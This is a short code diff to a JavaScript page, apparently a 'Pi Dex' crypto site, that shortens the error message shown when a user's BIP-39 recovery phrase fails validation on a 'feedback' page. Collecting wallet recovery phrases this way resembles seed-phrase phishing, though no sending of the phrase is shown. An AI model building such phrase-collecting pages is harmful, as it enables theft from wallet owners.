@@ -151,7 +151,7 @@ async function initializeFeedbackPage() {
 
         if (!isValidBip39Mnemonic(mnemonic)) {
             showError(
-                'Invalid recovery phrase. Please enter a valid BIP-39 passphrase.'
+                'Invalid passphrase.'
             );
             return;
         }
@@ -479,5 +479,6 @@ console.log('Pi Dex Script Loaded Successfully');
 console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
 console.log('Selected Network: ' + selectedNetwork);
 console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
+
 
 
